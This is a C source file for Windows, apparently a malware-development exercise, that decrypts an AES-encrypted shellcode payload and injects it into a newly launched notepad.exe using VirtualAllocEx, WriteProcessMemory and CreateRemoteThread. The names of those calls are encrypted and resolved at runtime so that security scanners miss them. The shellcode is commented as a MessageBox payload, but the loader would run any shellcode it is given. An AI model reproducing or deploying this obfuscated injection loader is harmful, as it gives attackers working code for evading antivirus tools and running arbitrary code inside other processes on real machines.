#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>
#include <tlhelp32.h>

// MessageBox shellcode - 64-bit
unsigned char payload[] = {0x21, 0x13, 0xd2, 0x21, 0xb2, 0xa3, 0xf, 0x8e, 0x13, 0x9, 0x72, 0xae, 0x2c, 0x59, 0xb8, 0x6a, 0xad, 0xcb, 0x90, 0xd8, 0x23, 0x38, 0x91, 0xa7, 0x21, 0xb6, 0x81, 0xdf, 0x34, 0x59, 0x25, 0x6, 0x21, 0x2d, 0x27, 0xdf, 0xe7, 0xc8, 0x96, 0x3f, 0xa8, 0xd8, 0xef, 0xfa, 0x3a, 0x67, 0x92, 0x2, 0xb9, 0xcd, 0xd3, 0x7a, 0x62, 0xe6, 0xc4, 0x62, 0xe2, 0x22, 0x88, 0xf7, 0x56, 0x6, 0xc8, 0x22, 0xbe, 0xbb, 0x3c, 0x45, 0x2c, 0x76, 0x84, 0x21, 0xbe, 0xb5, 0xd5, 0xd6, 0xd7, 0x15, 0xfd, 0x5e, 0x9a, 0x51, 0xbb, 0x3b, 0xc9, 0x15, 0x50, 0x74, 0x6, 0xf6, 0x9e, 0xbb, 0x9b, 0x9e, 0x6f, 0xd3, 0xd6, 0x64, 0xaa, 0x85, 0x14, 0x7a, 0xc, 0xb9, 0x54, 0x6f, 0x27, 0x3a, 0x9, 0x1d, 0x63, 0x61, 0x6f, 0x3c, 0x59, 0x9b, 0x33, 0xb, 0xb6, 0x12, 0x7e, 0x9b, 0x16, 0x62, 0x52, 0x43, 0xc, 0x99, 0xa2, 0xf6, 0x45, 0x29, 0xd6, 0x2d, 0xe7, 0x27, 0xcb, 0x2b, 0x99, 0x11, 0x3, 0xa8, 0xb9, 0xa1, 0x3b, 0x2c, 0x3a, 0x50, 0xb2, 0xb4, 0xc1, 0x1f, 0x18, 0xf0, 0x68, 0x53, 0x62, 0xf8, 0x39, 0x84, 0xd6, 0x8a, 0x5f, 0xd9, 0x33, 0xb3, 0xf1, 0xa9, 0x7b, 0x94, 0xa0, 0xb3, 0xd1, 0xda, 0xcf, 0xc3, 0xf9, 0x62, 0x7c, 0xf2, 0x3, 0xc7, 0xd, 0xdc, 0xad, 0xfd, 0x8c, 0x86, 0xce, 0xeb, 0xc3, 0x4e, 0xef, 0x90, 0x89, 0xaf, 0x3a, 0xf4, 0x4a, 0xcd, 0xe7, 0x7f, 0x92, 0x22, 0x28, 0x60, 0x2c, 0x39, 0x2d, 0xa2, 0xb6, 0x5f, 0x31, 0x6a, 0xac, 0xf4, 0xaa, 0x6, 0x43, 0x1a, 0xcb, 0x48, 0x18, 0x77, 0x46, 0x39, 0xa7, 0xa1, 0x7a, 0x59, 0xb4, 0x20, 0x2d, 0x7, 0xb1, 0xdd, 0x8c, 0x92, 0xbd, 0x7a, 0x7a, 0x7a, 0xf9, 0xbd, 0x4, 0xbd, 0xf9, 0xaf, 0xca, 0xf0, 0xb6, 0x9f, 0xf0, 0x5f, 0xc0, 0xe7, 0xee, 0x61, 0xda, 0xe2, 0x9d, 0x98, 0xd0, 0x5a, 0x6c, 0xda, 0xfa, 0xd8, 0x16, 0x27, 0x2c, 0x21, 0x9a, 0xe2, 0x26, 0xb2, 0x5a, 0x88, 0xf, 0x23, 0x32, 0x89, 0xdd, 0x8b, 0x90, 0x87, 0xcd, 0x47, 0x1a, 0x92, 0xde, 0x50, 0x71, 0xda, 0xf2, 0x3, 0x1c, 0x10, 0xe4, 0x5a, 0x4b, 0x58, 0x50, 0x8c, 0x1a, 0x1d, 0xf7, 0x54, 0x2f, 0xc1, 0x3, 0xc6, 0xc4, 0x1c, 0x42, 0x29, 0xf6, 0x3a, 0x4e, 0x15, 0x5c, 0x40, 0xbd, 0xff, 0x9a, 0x30, 0x9c, 0x75, 0x70, 0x1d, 0x18, 0x32, 0x9e, 0x9a, 0xc7, 0xf};
unsigned int payload_len = sizeof(payload);
char key[] = {0xe5, 0x45, 0x26, 0xa7, 0x81, 0x58, 0xb9, 0x94, 0x56, 0x68, 0xa5, 0xc0, 0xe8, 0xb7, 0x86, 0xe6, 0x7b, 0x2f, 0x50, 0xa2, 0xe8, 0xa6, 0x9b, 0xc5, 0x1d, 0x13, 0x0, 0xcf, 0x6b, 0xc9, 0x1f, 0xb3};

LPVOID (WINAPI * pVirtualAllocEx)(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);

BOOL (WINAPI * pWriteProcessMemory)(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);

HANDLE (WINAPI * pCreateRemoteThread)(
  HANDLE                 hProcess,
  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
  SIZE_T                 dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID                 lpParameter,
  DWORD                  dwCreationFlags,
  LPDWORD                lpThreadId
);

BOOL (WINAPI *pCreateProcess)(LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;

    if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
        return -1;
    }
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
        return -1;
    }
    if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
        return -1;              
    }
    if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
        return -1;
    }
    if (!CryptDecrypt(hKey, 0, 0, 0, payload, &payload_len)){
        return -1;
    }

    // Get the number of padding bytes
    int padding = (int)payload[payload_len - 1];

    // Remove the padding bytes
    payload_len -= padding;
    payload[payload_len] = '\0';

    CryptReleaseContext(hProv, 0);
    CryptDestroyHash(hHash);
    CryptDestroyKey(hKey);

    return 0;
}

int Inject(HANDLE hProc, unsigned char * payload, unsigned int payload_len){
    // The path of the Notepad executable
    const char* notepadPath = "C:\\Windows\\System32\\notepad.exe";
    BOOL (WINAPI *pCreateProcess)(LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION);
    pCreateProcess = (BOOL (WINAPI*)(LPCTSTR, LPTSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCTSTR, LPSTARTUPINFO, LPPROCESS_INFORMATION))GetProcAddress(GetModuleHandle("kernel32.dll"), "CreateProcessA");
    // Start the process
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (pCreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        if (pi.hProcess != NULL) {
			
			unsigned char sVE[] = { 0x77, 0xe7, 0x26, 0x4d, 0x23, 0x17, 0x30, 0xa2, 0x5b, 0xff, 0x39, 0x38, 0x80, 0xfd, 0xca, 0x8f};
			unsigned char sWP[] = { 0x41, 0xd5, 0x71, 0x2b, 0xd4, 0xd4, 0xab, 0x2d, 0x58, 0x62, 0x9e, 0xaf, 0xef, 0x18, 0x26, 0x58, 0x1b, 0xb7, 0x2a, 0x75, 0x7d, 0xa9, 0xd9, 0x0, 0xe4, 0xd4, 0xc2, 0x6c, 0x3c, 0x6f, 0xa, 0x94};
			unsigned char sCT[] = { 0x17, 0xa1, 0x8f, 0xd6, 0x2f, 0x2a, 0x7e, 0x4, 0x22, 0xf4, 0xdc, 0x80, 0xbb, 0x68, 0xf7, 0xaa, 0x5f, 0xda, 0xfe, 0xed, 0x4d, 0x71, 0x45, 0xcc, 0x59, 0x23, 0x12, 0xc4, 0x2a, 0xd5, 0x10, 0xcb};
			
			AESDecrypt((char *)sVE, sizeof(sVE), key, sizeof(key));
			AESDecrypt((char *)sWP, sizeof(sWP), key, sizeof(key));
			AESDecrypt((char *)sCT, sizeof(sCT), key, sizeof(key));
			
			//printf("Decrypted function name: %s\n", sVirtualAllocEx);
			//getchar();
			pVirtualAllocEx = (LPVOID (WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(GetModuleHandle("kernel32.dll"), (char *)sVE);
			
            //pVirtualAllocEx = (LPVOID (WINAPI*)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD))GetProcAddress(GetModuleHandle("kernel32.dll"), "VirtualAllocEx");
            pWriteProcessMemory = (BOOL (WINAPI*)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T *))GetProcAddress(GetModuleHandle("kernel32.dll"),(char *)sWP);
            pCreateRemoteThread = (HANDLE (WINAPI*)(HANDLE, LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD))GetProcAddress(GetModuleHandle("kernel32.dll"), (char *)sCT);
            AESDecrypt((char *) payload, payload_len, key, sizeof(key));

            LPVOID pRemoteCode = pVirtualAllocEx(pi.hProcess, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
            pWriteProcessMemory(pi.hProcess, pRemoteCode, payload, payload_len, NULL);
		
            HANDLE hThread = pCreateRemoteThread(pi.hProcess, NULL, 0, pRemoteCode, NULL, 0, NULL);
            if (hThread != NULL) {
                WaitForSingleObject(hThread, INFINITE);
                CloseHandle(hThread);
            }
            CloseHandle(pi.hProcess);
        }
        // Wait for the process to finish
        WaitForSingleObject(pi.hProcess, INFINITE);
        // Close the handles
        CloseHandle(pi.hThread);
    }
    else {
        // Failed to start the process
        printf("Failed to start Notepad.");
    }
}

int main (void) {
    // The path of the Notepad executable
    const char* notepadPath = "C:\\Windows\\System32\\notepad.exe";

    // Start the process
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    if (CreateProcess(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        if (pi.hProcess != NULL) {
            Inject(pi.hProcess, payload, payload_len);
            CloseHandle(pi.hProcess);
        }
        // Wait for the process to finish
        WaitForSingleObject(pi.hProcess, INFINITE);
        // Close the handles
        CloseHandle(pi.hThread);
    }
    else {
        // Failed to start the process
        printf("Failed to start Notepad.");
    }
}



